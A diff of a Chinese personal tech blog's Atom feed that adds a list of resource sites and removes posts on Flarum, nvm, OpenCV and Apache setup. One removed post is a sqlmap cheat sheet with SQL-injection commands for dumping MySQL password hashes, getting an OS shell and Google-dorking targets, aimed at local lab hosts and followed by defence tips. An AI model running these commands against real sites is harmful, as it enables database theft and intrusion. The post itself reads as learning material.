图片。</p></li><li><p>TinEye：<a href="https://www.tineye.com" target="_blank" rel="noopener">https://www.tineye.com</a><br>用图片来检索图片，我们可以上传图片或输入图片的 URL 来检索。</p></li><li><p>SemanticScholar：<a href="https://www.semanticscholar.org/" target="_blank" rel="noopener">https://www.semanticscholar.org/</a><br>SemanticScholar 是一个免费学术搜索引擎，其检索结果来自于期刊、学术会议资料或者是学术机构的文献。</p></li><li><p>LibreStock：<a href="https://librestock.com/" target="_blank" rel="noopener">https://librestock.com/</a><br>LibreStock 上可以检索一些优质的高清图片。</p></li><li><p>CC Search：<a href="https://ccsearch.creativecommons.org/" target="_blank" rel="noopener">https://ccsearch.creativecommons.org/</a><br>CC Search 上搜索到的图片资源都是无版权的，我们可以免费的使用。</p></li><li><p>搜索论文等 <a href="https://libgen.is/" target="_blank" rel="noopener">https://libgen.is/</a></p></li></ul>]]></content>
+    <content type="html"><![CDATA[<h2 id="百度云资料"><a href="#百度云资料" class="headerlink" title="百度云资料"></a>百度云资料</h2><p>个人整理的编程、大学资料、文学等的书籍<br>存在百度云里，可自行转存<br><a href="https://pan.baidu.com/s/1CPx9pbOlVSYdFYNxH3dTmA" target="_blank" rel="noopener">https://pan.baidu.com/s/1CPx9pbOlVSYdFYNxH3dTmA</a> 提取码: mc5d <a href="https://pan.baidu.com/s/1wAzs6cNdvPH34LnRC-8lKA" target="_blank" rel="noopener">https://pan.baidu.com/s/1wAzs6cNdvPH34LnRC-8lKA</a> 提取码: ty5e</p><h2 id="图标库"><a href="#图标库" class="headerlink" title="图标库"></a>图标库</h2><ul><li>阿里巴巴图标库 <a href="http://www.iconfont.cn" target="_blank" rel="noopener">http://www.iconfont.cn</a></li><li>icon8 <a href="https://icons8.com" target="_blank" rel="noopener">https://icons8.com</a></li><li>easyicon <a href="http://www.easyicon.net" target="_blank" rel="noopener">http://www.easyicon.net</a></li><li>iconpng <a href="http://iconpng.com" target="_blank" rel="noopener">http://iconpng.com</a></li><li>iconninja <a href="http://iconninja.com" target="_blank" rel="noopener">http://iconninja.com</a></li><li>Roundicons.com <a href="http://Roundicons.com" target="_blank" rel="noopener">http://Roundicons.com</a></li><li>undraw <a href="https://undraw.co/illustrations" target="_blank" rel="noopener">https://undraw.co/illustrations</a></li><li>instantlogosearch <a href="http://instantlogosearch.com/" target="_blank" rel="noopener">http://instantlogosearch.com/</a></li><li>logomaker <a href="https://logomakr.com/" target="_blank" rel="noopener">https://logomakr.com/</a></li><li>flaticon <a href="https://www.flaticon.com/" target="_blank" rel="noopener">https://www.flaticon.com/</a></li></ul><h2 id="搜索网站"><a href="#搜索网站" class="headerlink" title="搜索网站"></a>搜索网站</h2><ul><li><p>Bing 国际版：<a href="https://cn.bing.com/" target="_blank" rel="noopener">https://cn.bing.com/</a></p></li><li><p>DuckDuckGo：<a href="https://duckduckgo.com/" target="_blank" rel="noopener">https://duckduckgo.com/</a> 保护你的隐私</p></li><li><p>Stack Overflow：<a href="https://stackoverflow.com/" target="_blank" rel="noopener">https://stackoverflow.com/</a> 程序员的问题基本都可以在这里得到解决</p></li><li><p>Gitlogs：<a href="https://www.gitlogs.com/" target="_blank" rel="noopener">https://www.gitlogs.com/</a><br>Gitlogs 是专门针对 GitHub 项目的搜索引擎，我们通过他可以快速找到想要项目。</p></li><li><p>jiumo search 鸠摩搜书：<a href="https://www.jiumodiary.com/。" target="_blank" rel="noopener">https://www.jiumodiary.com/。</a><br>可以用来找一些技术文档手册，很多在百度网盘里。</p></li><li><p>Ebooke：<a href="https://ebookee.org/" target="_blank" rel="noopener">https://ebookee.org/</a><br>Ebookee 是一个基于互联网并提供免费电子图书下载的搜索引擎网站。</p></li><li><p>Iconfinder图标搜索：<a href="https://www.iconfinder.com/" target="_blank" rel="noopener">https://www.iconfinder.com/</a><br>用来查找 logo 图片。</p></li><li><p>TinEye：<a href="https://www.tineye.com" target="_blank" rel="noopener">https://www.tineye.com</a><br>用图片来检索图片，我们可以上传图片或输入图片的 URL 来检索。</p></li><li><p>SemanticScholar：<a href="https://www.semanticscholar.org/" target="_blank" rel="noopener">https://www.semanticscholar.org/</a><br>SemanticScholar 是一个免费学术搜索引擎，其检索结果来自于期刊、学术会议资料或者是学术机构的文献。</p></li><li><p>LibreStock：<a href="https://librestock.com/" target="_blank" rel="noopener">https://librestock.com/</a><br>LibreStock 上可以检索一些优质的高清图片。</p></li><li><p>CC Search：<a href="https://ccsearch.creativecommons.org/" target="_blank" rel="noopener">https://ccsearch.creativecommons.org/</a><br>CC Search 上搜索到的图片资源都是无版权的，我们可以免费的使用。</p></li><li><p>搜索论文等 <a href="https://libgen.is/" target="_blank" rel="noopener">https://libgen.is/</a></p></li></ul><h2 id="搭建图床服务器"><a href="#搭建图床服务器" class="headerlink" title="搭建图床服务器"></a>搭建图床服务器</h2><pre><code>https://github.com/helloxz/imgurl.gitGithub：https://github.com/178146582/Fantasy-fieldGithub：https://github.com/wisp-x/lsky-pro</code></pre>]]></content>
     
     <summary type="html">
     
@@ -392,126 +513,6 @@ yum install -y wget &amp;amp;&amp;amp; wget -O install.sh http://download.bt.cn/
         
         
           &lt;pre class=&quot;line-numbers language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot; spellcheck=&quot;true&quot;&gt;# -*- coding: utf-8
-        
-      
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Install Flarum</title>
-    <link href="https://hualin.online/install-flarum/"/>
-    <id>https://hualin.online/install-flarum/</id>
-    <published>2019-09-12T14:19:30.000Z</published>
-    <updated>2019-09-12T14:19:44.556Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="test-flarum"><a href="#test-flarum" class="headerlink" title="test flarum"></a>test flarum</h2><p><a href="https://github.com/flarum/flarum.git" target="_blank" rel="noopener">github</a></p><p>1.install composer:<br><code>composer create-project flarum/flarum . --stability=beta</code><br>2.in order to use php</p><pre><code>sudo apt-get -y install gcc make autoconf libc-dev pkg-configsudo apt-get -y install php7.2-devsudo apt-get -y install libmcrypt-devsudo pecl install mcrypt-1.0.2 //for php&gt;7.3</code></pre><p>3.for arch<br><code>extra/php-sodium</code><br><code>php-set = extension=sodium</code>in /etc/php/php.ini</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        
-        
-          &lt;h2 id=&quot;test-flarum&quot;&gt;&lt;a href=&quot;#test-flarum&quot; class=&quot;headerlink&quot; title=&quot;test flarum&quot;&gt;&lt;/a&gt;test flarum&lt;/h2&gt;&lt;p&gt;&lt;a
-        
-      
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Sqmap Simple Intro</title>
-    <link href="https://hualin.online/sqmap-simple-intro/"/>
-    <id>https://hualin.online/sqmap-simple-intro/</id>
-    <published>2019-09-12T14:14:36.000Z</published>
-    <updated>2019-09-16T13:17:03.499Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><pre><code>./sqlmap.py -u &quot;http://localhost:88/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; –cookie=mycookice.txt –batch./sqlmap.py -u &quot;http://192.168.3.64:8080/user/login?username=foo&amp;passwd=bar&quot; –batch -D sql_inject_demo -T t_user –columns./sqlmap.py -u &quot;http://192.168.3.64:8080/user/login?username=foo&amp;passwd=bar&quot; –batch -D sql_inject_demo -T t_user -C ‘username, passwd’ –dump./sqlmap.py -u &quot;http://192.168.3.64:8080/user/login?username=foo&amp;passwd=bar&quot; –batch -D mysql -T user -C ‘user, authentication_string’ –dump./sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; –os-shell // 获取远程主机的shell./sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; –os-cmd=&quot;whoami&quot; // 执行远程主机的命令./sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; –is-dba // 检查DBMS用户是否为DBA./sqlmap.py -g &quot;inurl:php?id=&quot; // 通过google寻找url带有php?id=字段的地址</code></pre><p><strong>参数解析</strong><br>–batch –dbs //showdatabases<br>–batch –current-db //showcurrentdb<br>–batch -D database -T user -C varchar–tables //showtables<br>–columns //showcolumns<br>–tables //thesame<br>–dump //查询出所有数据表的所有数据</p><p><strong>以GET方式的cookice形式:</strong><br>_ga=GA1.1.1240902680.1567156892; portainer.datatable_text_filter_home_endpoints=; PHPSESSID=r56dp5dsqrc9rmjq74k85m4jd1; security=low</p><p><strong>POST注入方式:</strong><br>$ python sqlmap.py -r header.txt –dbs<br>// -r是从一个文件中载入HTTP请求<br>// 其余都与GET一样将-u部分改成-r header.txt<br>从chrome保存下来的request header:<br>POST /index.php HTTP/1.1 …</p><p>sqlmap.py -u “url” –cookie=”” –data=“post源码” –batch –smart启发式判断<br>批量检测注入漏洞<br>sqlmap.py -g “url匹配” –batch –smart<br>sqlmap.py -l txt文件名 –batch –smart</p><h2 id="防护sql注入"><a href="#防护sql注入" class="headerlink" title="防护sql注入"></a>防护sql注入</h2><p>那么，如何防护sql的注入呢<br>（1）永远不要相信用户的输入，必须对用户的输入进行校验，过滤，可以通过正则表达式，输入的字符长度限制但双引号，转义字符等，可以前后端进行结合对用户的输入验证<br>（2）重要的数据等不能明文显示，必须加密<br>（3）不要用管理员的权限登录数据库，可以在数据库的安全性文件夹-架构-新建架构，然后在数据表上添加架构的名称，查询数据表时需要在表明前面加上架构的前缀才能查询，这样有效防止对数据表名的猜测。<br>（4）对于系统的错误提示尽可能少，或者对其提示进行改变，隐藏不必要的系统信息。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        
-        
-          &lt;h2 id=&quot;常用命令&quot;&gt;&lt;a href=&quot;#常用命令&quot; class=&quot;headerlink&quot; title=&quot;常用命令&quot;&gt;&lt;/a&gt;常用命令&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;./sqlmap.py -u
-        
-      
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Use Nvm</title>
-    <link href="https://hualin.online/use-nvm/"/>
-    <id>https://hualin.online/use-nvm/</id>
-    <published>2019-09-11T13:59:05.000Z</published>
-    <updated>2019-09-14T09:59:15.483Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="先卸载系统的node"><a href="#先卸载系统的node" class="headerlink" title="先卸载系统的node"></a>先卸载系统的node</h3><pre class="line-numbers language-shell"><code class="language-shell">sudo rm /usr/local/bin/npmsudo rm /usr/local/share/man/man1/node.1sudo rm /usr/local/lib/dtrace/node.dsudo rm -rf ~/.npmsudo rm -rf ~/.node-gypsudo rm /opt/local/bin/nodesudo rm /opt/local/include/nodesudo rm -rf /opt/local/lib/node_modules<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><pre><code>nvm install 4.2.2nvm ls-remotenvm use 4.2.2nvm use node //newestnvm alias awesome-version 4.2.2nvm run 4.2.2 --version</code></pre><p>在当前终端的子进程中运行特定版本的 Node<br><code>nvm exec 4.2.2 node --version</code></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        
-        
-          &lt;h3 id=&quot;先卸载系统的node&quot;&gt;&lt;a href=&quot;#先卸载系统的node&quot; class=&quot;headerlink&quot; title=&quot;先卸载系统的node&quot;&gt;&lt;/a&gt;先卸载系统的node&lt;/h3&gt;&lt;pre class=&quot;line-numbers
-        
-      
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Install Opencv on Linux</title>
-    <link href="https://hualin.online/install-opencv-on-linux/"/>
-    <id>https://hualin.online/install-opencv-on-linux/</id>
-    <published>2019-09-11T13:57:53.000Z</published>
-    <updated>2019-09-11T14:02:42.292Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="simple-guide-to-install-opencv-on-ubuntu"><a href="#simple-guide-to-install-opencv-on-ubuntu" class="headerlink" title="simple guide to install opencv on ubuntu"></a>simple guide to install opencv on ubuntu</h1><h2 id="system-depandencies"><a href="#system-depandencies" class="headerlink" title="system depandencies"></a>system depandencies</h2><pre><code>sudo apt-get install build-essentialsudo apt-get install cmake git libgtk2.0-dev pkg-config libavcodec-dev libavformat-dev libswscale-devsudo apt-get install python-dev python-numpy libtbb2 libtbb-dev libjpeg-dev libpng-dev libtiff-dev libjasper-dev libdc1394-22-dev</code></pre><h2 id="build-opencv"><a href="#build-opencv" class="headerlink" title="build opencv"></a>build opencv</h2><pre><code>git clone https://github.com/opencv/opencv.gitgit clone https://github.com/opencv/opencv_contrib.gitcd opencvmkdir build &amp;&amp; cd buildcmake -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/usr/local ..cmake -DCMAKE_INSTALL_PREFIX=/usr-DCMAKE_BUILD_TYPE=Release-DENABLE_CXX11=ON-DBUILD_PERF_TESTS=OFF-DWITH_XINE=ON-DBUILD_TESTS=OFF-DENABLE_PRECOMPILED_HEADERS=OFF-DCMAKE_SKIP_RPATH=ON-DBUILD_WITH_DEBUG_INFO=OFF-DBUILD_SHARED_LIBS=OFF-Wno-dev .. &amp;&amp; makecd opencv/build/doc/make -j7 html_docssudo make installgit clone https://github.com/opencv/opencv_extra.gitpkg-config –modversion opencv</code></pre><pre><code>## Description of some parametersbuild type: CMAKE_BUILD_TYPE=ReleaseDebugto build with modules from opencv_contrib set OPENCV_EXTRA_MODULES_PATH to &lt;path to opencv_contrib/modules/&gt;set BUILD_DOCS for building documentsset BUILD_EXAMPLES to build all examples[optional] Building python. Set the following python parameters:PYTHON2(3)_EXECUTABLE = &lt;path to python&gt;PYTHON_INCLUDE_DIR = /usr/include/python&lt;version&gt;PYTHON_INCLUDE_DIR2 = /usr/include/x86_64-linux-gnu/python&lt;version&gt;PYTHON_LIBRARY = /usr/lib/x86_64-linux-gnu/libpython&lt;version&gt;.soPYTHON2(3)_NUMPY_INCLUDE_DIRS = /usr/lib/python&lt;version&gt;/dist-packages/numpy/core/include/[optional] Building java.Unset parameter: BUILD_SHARED_LIBSIt is useful also to unset BUILD_EXAMPLES, BUILD_TESTS, BUILD_PERF_TESTS – as they all will be statically linked with OpenCV and can take a lot of memory.</code></pre><h2 id="test-your-opencv"><a href="#test-your-opencv" class="headerlink" title="test your opencv"></a>test your opencv</h2><pre><code>g++ -o main /home/lithium/Documents/opencv-lena.cpp `pkg-config opencv –cflags –libs`sudo apt-get install libopencv-dev## uninstall opencvsudo rm -r /usr/local/include/opencv2 /usr/local/include/opencv /usr/include/opencv /usr/include/opencv2 /usr/local/share/opencv /usr/local/share/OpenCV /usr/share/opencv /usr/share/OpenCV /usr/local/bin/opencv* /usr/local/lib/libopencv*sudo apt-get –purge remove opencv-doc opencv-data python-opencv</code></pre><h2 id="config-PATH"><a href="#config-PATH" class="headerlink" title="config PATH"></a>config PATH</h2><pre><code>CPLUS_INCLUDE_PATH=$CPLUS_INCLUDE_PATH:/usr/include/libxml2:/usr/local/include/opencv4/opencv2export CPLUS_INCLUDE_PATHC_INCLUDE_PATH=/usr/include/libxml2:/usr/local/include/opencv4/opencv2/export C_INCLUDE_PATHLD_LIBRARY_PATH=$LD_LIBRARY_PATH:/MyLibexport LD_LIBRARY_PATHLIBRARY_PATH=$LIBRARY_PATH:/MyLibexport LIBRARY_PATH</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        
-        
-          &lt;h1 id=&quot;simple-guide-to-install-opencv-on-ubuntu&quot;&gt;&lt;a href=&quot;#simple-guide-to-install-opencv-on-ubuntu&quot; class=&quot;headerlink&quot; title=&quot;simple
-        
-      
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Apache-Php-Config</title>
-    <link href="https://hualin.online/apache-php-config/"/>
-    <id>https://hualin.online/apache-php-config/</id>
-    <published>2019-09-10T13:12:03.000Z</published>
-    <updated>2019-09-10T13:24:52.532Z</updated>
-    
-    <content type="html"><![CDATA[<p>vim /usr/local/apache2/conf/httpd.conf<br><directory><br>    Options FollowSymLinks<br>    AllowOverride None<br>    Order deny,allow<br>    Deny from all<br></directory></p><p>AddType application/x-gzip .gz .tgz<br>在其下面添加：<br>ddType application/x-httpd-php .php</p><ifmodule dir_module>    DirectoryIndex index.html//DirectoryIndex index.html index.htm index.php</ifmodule><p>ServerName localhost:80<br>/usr/local/apache2/bin/apachectl -t</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        
-        
-          &lt;p&gt;vim /usr/local/apache2/conf/httpd.conf&lt;br&gt;&lt;directory&gt;&lt;br&gt;    Options FollowSymLinks&lt;br&gt;    AllowOverride None&lt;br&gt;    Order
         
       
     
